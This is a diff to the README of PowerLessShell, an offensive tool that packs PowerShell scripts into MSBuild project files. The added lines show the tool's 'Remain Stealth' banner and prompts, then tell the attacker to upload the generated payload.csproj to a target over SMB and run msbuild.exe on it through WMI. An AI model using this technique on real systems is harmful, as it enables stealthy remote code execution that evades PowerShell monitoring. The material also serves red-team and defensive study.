@@ -6,7 +6,34 @@ PowerLessShell rely on MSBuild.exe to remotely execute PowerShell scripts and co
 
 Attacker side
 ```
-$ python PowerLessShell.py path_to_powershellscript > payload
+$ python PowerLessShell.py
+
+
+PowerLessShell - Remain Stealth
+         More PowerShell Less Powershell.exe - Mr.Un1k0d3r RingZer0 Team
+            ___
+        .-"; ! ;"-.
+      .'!  : | :  !`.
+     /\  ! : ! : !  /\
+    /\ |  ! :|: !  | /\
+   (  \ \ ; :!: ; / /  )
+  ( `. \ | !:|:! | / .' )
+  (`. \ \ \!:|:!/ / / .')
+   \ `.`.\ |!|! |/,'.' /
+    `._`.\\!!!// .'_.'
+       `.`.\|//.'.'
+        |`._`n'_.'|
+        `----^----"
+
+
+
+(Path to the PowerShell script)>>> ../test.txt
+
+(Path for the output MsBuild file)>>> ../payload.csproj
+
+Upload payload.csproj on the target system through SMB
+Run the following command on the target system using WMI:
+cmd /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.csproj
 ```
 
 Victim side (Push the file using SMB. Execute the following command using WMI)
